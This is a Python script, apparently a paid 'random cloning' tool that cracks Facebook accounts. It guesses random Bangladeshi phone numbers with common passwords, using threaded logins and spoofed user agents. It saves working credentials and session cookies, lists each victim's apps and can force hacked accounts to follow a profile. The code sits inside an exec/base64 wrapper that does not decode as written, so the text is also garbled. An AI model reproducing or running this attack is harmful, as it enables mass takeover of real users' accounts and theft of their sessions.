import base64
exec(base64.b64decode("#codding by SH4WON AHMED❤️✨
#FB LINk: https://www.facebook.com/cyber.gamer.SH4WON.0
#FUCK YOUR BYPASS SYSTEM 😤

import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

def khld():

    os.system('clear')

    jalan(logo)    
    
    print('\033[1;92m')

    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m RANDOM CRACK ')

    jalan('\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m CONTACT ME FACEBOOK')

    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m FOLLOW GITHUB ACCOUNT')

    jalan('\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m FOLLOW PAGE')

    jalan('\033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m EXIT')

    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;91m•]\033[1;32m CHOOSE : ')

    if opt == '1':

        i()

    if None == '2':

        os.system('xdg-open https://www.facebook.com/cyber.gamer.SH4WON.0')

        return None

    if None == '3':

        os.system('xdg-open https://github.com/G4MER-SH4WON-404')

        return None

    if None == '4':

        os.system('xdg-open https://youtube.com/@shawontechbd5129')

    if None == '0':

        os.system('exit')

        return None

    

def cek_apk(session,coki):

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))

        #else:

            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))

    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text

    sop = BeautifulSoup(w,"html.parser")

    x = sop.find("form",method="post")

    game = [i.text for i in x.find_all("h3")]

    if len(game)==0:

        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))

    else:

        print(f'\r[ðŸŽ®] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))

        for i in range(len(game)):

            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

        else:

            print('')



def follow(self, session, coki):

        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {

            'cookie': coki }, **('cookies',)).text, 'html.parser')

        get = r.find('a', 'Ikuti', **('string',)).get('href')

        session.get('https://mbasic.facebook.com' + str(get), {
        
            'cookie': coki }, **('cookies',)).text

            
           

class jalan:

    def __init__(self, z):

        for e in z + "\n":

            sys.stdout.write(e)

            sys.stdout.flush()

            time.sleep(0.001)

            

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;92m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

A = '\x1b[1;97m' 

B = '\x1b[1;96m' 

C = '\x1b[1;91m' 

D = '\x1b[1;92m'

M = '\033[1;31m'

H = '\033[1;32m'

N = '\x1b[1;37m'    

E = '\x1b[1;93m' 

F = '\x1b[1;94m'

G = '\x1b[1;95m'

P = '\033[1;37m'

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today()

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()
mahdi='https://raw.githubusercontent.com/G4MER-SH4WON-404/RANDOM-TEST/main/Approval.txt'
ta = current.year

bu = current.month

ha = current.day

today = date.today()

logo =                                          ("""   

\33[1;92md8b   db  .d88b.  d8888b. d888888b d888888b  .d8b.  
\33[1;92m888o  88 .8P  Y8. 88  `8D   `88'   `~~88~~' d8' `8b 
\33[1;92m88V8o 88 88    88 88oooY'    88       88    88ooo88 
\33[1;92m88 V8o88 88    88 88~~~b.    88       88    88~~~88 
\33[1;92m88  V888 `8b  d8' 88   8D   .88.      88    88   88 
\33[1;92mVP   V8P  `Y88P'  Y8888P' Y888888P    YP    YP   YP 

\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
║  \x1b[97m\033[37;41m  FREE BANGLADESHI RANDOM CLONING V30 \033[0;m    ║
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
\33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\33[1;92m║[~] \033[1;91m DEVOLPER   :          MR NOBITA        \33[1;92m║               
\33[1;92m║[~]  FACEBOOK   :          SAHADAT HOSSAIN  \33[1;92m║                 
\33[1;92m║[~] \033[1;93m NETWORK    :          3G/4G/5G /Fire🧨\33[1;92m ║
\33[1;92m║[~] \033[1;34m GITHUB     :          G4MER-SH4WON-404\33[1;92m ║          
\33[1;92m║[~] \033[1;35m TOOLS      :          BD RANDOM FIRE  \33[1;92m ║                 
\33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
""")

loop = 0

oks = []

cps = []



def clear():

    os.system('clear')

    print(logo)

from time import localtime as lt

from os import system as cmd

ltx = int(lt()[3])

if ltx > 12:

    a = ltx-12

    tag = "PM"

else:

    a = ltx

    tag = "AM"

    

    
def pp():
        print (logo)

        print ('         FUCK YOUR BYPASS SYSTEM 📌 ')
        
        print('')

        print ('\x1b[1;92m        You Dont Have Subscrption')
        
        print('')

        print ('          This is MR NOBITA Tools So Need to Approval')
        
        print('')

        print ('\033[1;92m         If you want to buy presh enter')

        print ('')

        myid = uuid.uuid4().hex[:10]

        print ('         YOUR KEY :\033[1;93m ' + myid + imt)

        kok = open('/sdcard/.mahdi.txt', 'w')

        kok.write(myid + imt)

        kok.close()

        print ('')

        input('   \x1b[0;34mENTER TO BUY TOOLS ')

        os.system('am start https://wa.me/+8801941010189?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20NOBITA%20Paid%20Tools.%20My%20Key:%20'+key1)

        mex()
try:

    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')

    v = 5.2

    update = ('5.2')

    update = ('5.2')

    if str(v) in update:

        os.system('clear')

    else:pass

except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')

#global functions
imt = '=USER='
def dynamic(text):

    titik = ['.   ','..  ','... ','.... ']

    for o in titik:

        print('\r'+text+o),

        sys.stdout.flush();time.sleep(1)



#User agents

ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    

# APK CHECK

def i():

    user=[]

    twf =[]

    os.getuid

    os.geteuid

    os.system("clear")

    jalan(logo)

    jalan('\033[1;92m')
    jalan('\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
    jalan('\033[1;92m\n')
    code = input('\033[1;35m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32mCHOOSE YOUR COUNTRY CODE : ')

    print("")

    os.system('clear')

    bal = input("ENTER YOUR NAME : ")

    os.system('clear')

    print(logo)

    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32mCHOOSE CRACKING LIMIT : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(8))

        user.append(nmp)

    with ThreadPool(max_workers=50) as manshera:

        clear()

        tl = str(len(user))

        print(f"\033[1;91m[\033[1;92m~\033[1;91m]{GREEN} TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")

        print('\033[1;91m[\033[1;92m~\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)

        print('\033[1;91m[\033[1;92m~\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;90m'+code)

        print('\033[1;91m[\033[1;92m~\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)

        print('\033[1;91m[\033[1;92m~\033[1;91m]\033[1;92m CRACKING HAS STARTED')

        print('\033[1;91m[\033[1;92m~\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
        
        print('\033[1;91m[\033[1;92m~\033[1;91m]\033[1;92m MR NOBITA TOOLS UPDATE Done✨')

        jalan('\33[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

        for love in user:

            pwx = [love,'bangladesh','Bangladesh','free fire','freefire']

            uid = code+love

            manshera.submit(rcrack,uid,pwx,tl)

    print('CRACK PROCESS HAS BEEN COMPLETED ')

    print('IDS SAVED IN NOBITA-OK.txt, NOBITA-CP.txt')

def mex():

    imt = '=USER='

    os.system('clear')

    print (logo)

    

    try:

        key1 = open('/sdcard/.mahdi.txt', 'r').read()

    except IOError:

        os.system('clear')
        pp()

    r = requests.get(mahdi).text

    if key1 in r:

        print("\33[1;32mYour Key is Successfully Approved")

        time.sleep(0.5)

        khld()

    else:

        os.system('clear')

        print (logo)

        print ('         FUCK YOUR BYPASS SYSTEM BRO📌 ')

        print('')

        print ('         You Dont Have Subscrption')
        
        print('')
        
        print ('         THIS IS MR NOBITA PAID TOOL💸 ')

        print ('')

        print ('         YOUR KEY : \033[1;93m' + key1)

        print ('')

        print ('         \x1b[0;34mIF YOU BUY TOOLS CONTACT ME📞 ')

        print ('')

        input('\033[1;92m         If you want to buy presh enter')

        os.system('am start https://wa.me/+8801941010189?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20NOBITA%20Paid%20Tools.%20My%20Key:%20'+key1)

        mex()

##################

 

   

def rcrack(uid,pwx,tl):

    #print(user)

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            free_fb = session.get('https://mbasic.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}
            
            header_freefb = {'authority': 'x.facebook.com',
			'method': 'GET',
			'scheme':'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-encoding':'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://x.facebook.com/?stype=lo&jlou=AffnTQdOAb-5XgBcCyl2UwCfA2_mop92sJ5558lDcDUcfPcF91BaBNq1VUAxIjDC-sfZvMkcpSM1STr0Ub_1eany66MjfT-MnCHIo6FrOKo3jA&smuh=24495&lh=Ac_MFMr4Uj4cw9j7lKc&_rdr',
            'sec-ch-ua':'"Chromium"; v="111", "Not)A; Brand"; v="8"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
		   'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'user-agent': pro,}

            lo = session.post('https://x.facebook.com/?stype=lo&jlou=AffnTQdOAb-5XgBcCyl2UwCfA2_mop92sJ5558lDcDUcfPcF91BaBNq1VUAxIjDC-sfZvMkcpSM1STr0Ub_1eany66MjfT-MnCHIo6FrOKo3jA&smuh=24495&lh=Ac_MFMr4Uj4cw9j7lKc&refid=8&hide_dialog=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print('\r\r\033[1;32m[NOBITA-OK💚] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[💉]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[✨] [AGENT] = \033[1;35m'+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/NOBITA-OK.txt', 'a').write( cid+' | '+ps+'\n')

                oks.append(cid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[24:39]

                print('\r\r\33[1;30m[NOBITA-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/NOBITA-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[NOBITA-M2] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),

        sys.stdout.flush()

    except:

        pass



mex()"))